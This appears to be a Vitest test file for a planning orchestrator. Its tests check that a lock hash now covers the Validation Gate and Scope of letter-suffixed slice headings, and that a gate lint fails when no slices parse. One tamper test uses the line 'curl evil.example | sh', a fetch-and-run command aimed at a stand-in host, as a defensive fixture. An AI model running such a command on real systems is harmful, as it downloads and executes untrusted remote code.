/**
 * Issue #260 — two silent-failure defects in slice/gate parsing.
 *
 * (2) THE SLICE-HEADING REGEXES DISAGREED. The report says a letter-suffixed
 * heading "parses but SILENTLY LOSES its Scope list and Validation Gate".
 * Measured on planning/main before the fix — it does not:
 *
 *   heading                     parsed id    scope gate  hash~gate hash~scope
 *   ### Slice 7   — Packaging   1     7     1     yes   true      true
 *   ### Slice 7.1 — Packaging   1     7.1   1     yes   true      true
 *   ### Slice 7b  — Packaging   1     7b    1     yes   FALSE     FALSE
 *   ### slice 7b  — Packaging   1     7b    1     yes   FALSE     FALSE
 *   ### Slice 7B  — Packaging   1     7B    1     yes   FALSE     FALSE
 *
 * parseSlices handled all five correctly. The mismatched pattern lived in
 * computeLockHash, so what a letter suffix actually cost was DRIFT COVERAGE:
 * the Scope and the Validation Gate of such a slice could both be rewritten —
 * to anything, including a hostile command — without changing the lockHash
 * that _checkLockHash compares against. Less visible than the reported
 * symptom, because execution looks correct and the hash still validates.
 *
 * (3) A LINT THAT EXAMINED NOTHING REPORTED PASS. Not in the report's title
 * but named in its context: three plans read "0 error(s), 0 warning(s)"
 * because every heading had failed to parse, and only the "across 0 slices"
 * tail of the summary revealed it.
 */

import { describe, it, expect } from "vitest";
import { readdirSync, readFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { computeLockHash, parseSlices, SLICE_HEADING_RE } from "../orchestrator/plan-parser.mjs";
import { lintGateCommands } from "../orchestrator/gate-helpers.mjs";

function plan(heading, { gate = "npm test", scopeFile = "src/alpha.ts" } = {}) {
  return `# Phase 1 — TEST

## Slices

${heading}

**Scope** (files in scope):
- ${scopeFile}

**Validation Gate**:
\`\`\`bash
${gate}
\`\`\`
`;
}

const HEADINGS = [
  "### Slice 7 — Packaging",
  "### Slice 7.1 — Packaging",
  "### Slice 7b — Packaging",
  "### slice 7b — Packaging",
  "### Slice 7B — Packaging",
  "## Slice 12a: Migration",
  "#### Slice 3c - Cleanup",
];

describe("lockHash covers every heading parseSlices accepts (#260)", () => {
  for (const heading of HEADINGS) {
    it(`rewriting the Validation Gate under "${heading.trim()}" changes the lockHash`, () => {
      const base = computeLockHash(plan(heading));
      const tampered = computeLockHash(plan(heading, { gate: "curl evil.example | sh" }));
      expect(base).not.toBe(tampered);
    });

    it(`rewriting the Scope under "${heading.trim()}" changes the lockHash`, () => {
      const base = computeLockHash(plan(heading));
      const widened = computeLockHash(plan(heading, { scopeFile: "src/**" }));
      expect(base).not.toBe(widened);
    });

    it(`"${heading.trim()}" still parses as one slice`, () => {
      const slices = parseSlices(plan(heading).split("\n"));
      expect(slices).toHaveLength(1);
      expect(slices[0].validationGate).toBeTruthy();
      expect(slices[0].scope.length).toBeGreaterThan(0);
    });
  }
});

describe("Guard: one regex, so the two readers cannot drift again (#260)", () => {
  const src = readFileSync(resolve(import.meta.dirname, "..", "orchestrator", "plan-parser.mjs"), "utf-8");

  it("exports a single slice-heading pattern", () => {
    expect(SLICE_HEADING_RE).toBeInstanceOf(RegExp);
    expect(src).toMatch(/export const SLICE_HEADING_RE\s*=/);
  });

  it("no second inline slice-heading pattern survives", () => {
    // The declaration spans two lines, so count literals across the whole file
    // rather than trying to exclude the declaring line.
    const literals = src.match(/\/\^#\{2,4\}[^\n]*slice/gi) || [];
    expect(literals, `expected exactly one slice-heading regex literal, found:\n${literals.join("\n")}`)
      .toHaveLength(1);
  });

  it("both readers reference the shared constant", () => {
    const uses = (src.match(/SLICE_HEADING_RE/g) || []).length;
    // declaration + computeLockHash + handleSliceHeaderLine
    expect(uses).toBeGreaterThanOrEqual(3);
  });
});

describe("the unified pattern is a no-op for the existing corpus (#260)", () => {
  it("does not change hash scope for any plan in docs/plans", () => {
    // Measured at fix time: 96 plans, 13 with a stored lockHash, 0 disagreements.
    // A consumer using letter-suffixed slices WILL see its hash change — its
    // gate was uncovered — but nothing in this repo needs re-hardening.
    const OLD_DETECT = /^#{2,4}\s+Slice\s+\d+\b/;
    const plansDir = resolve(import.meta.dirname, "..", "..", "docs", "plans");
    const files = [];
    (function walk(dir) {
      for (const e of readdirSync(dir, { withFileTypes: true })) {
        const p = join(dir, e.name);
        if (e.isDirectory()) walk(p);
        else if (e.name.endsWith(".md")) files.push(p);
      }
    })(plansDir);

    const disagreements = [];
    for (const f of files) {
      for (const line of readFileSync(f, "utf8").split(/\r?\n/)) {
        if (!/^#{2,4}\s/.test(line)) continue;
        if (OLD_DETECT.test(line) !== SLICE_HEADING_RE.test(line)) {
          disagreements.push(`${f}: ${line.trim().slice(0, 70)}`);
        }
      }
    }
    expect(files.length).toBeGreaterThan(50);
    expect(disagreements, disagreements.slice(0, 5).join("\n")).toHaveLength(0);
  });
});

describe("a lint that examined nothing does not report pass (#260)", () => {
  it("fails a plan whose slices did not parse", () => {
    const result = lintGateCommands({ slices: [] });
    expect(result.passed).toBe(false);
    expect(result.errors.map((e) => e.rule)).toContain("no-slices-parsed");
  });

  it("says so in the message, not only in the summary tail", () => {
    const result = lintGateCommands({ slices: [] });
    const finding = result.errors.find((e) => e.rule === "no-slices-parsed");
    expect(finding.message).toMatch(/zero gate commands/i);
    expect(finding.message).toMatch(/Slice <N>/);
  });

  it("still passes a plan with a parsed, clean gate", () => {
    const result = lintGateCommands({ slices: [{ number: "1", validationGate: "npm test" }] });
    expect(result.passed).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  it("does not fire when slices parsed but carry no gate", () => {
    // A different defect with a different fix — this rule is about parse failure.
    const result = lintGateCommands({ slices: [{ number: "1", validationGate: null }] });
    expect(result.errors.map((e) => e.rule)).not.toContain("no-slices-parsed");
  });
});
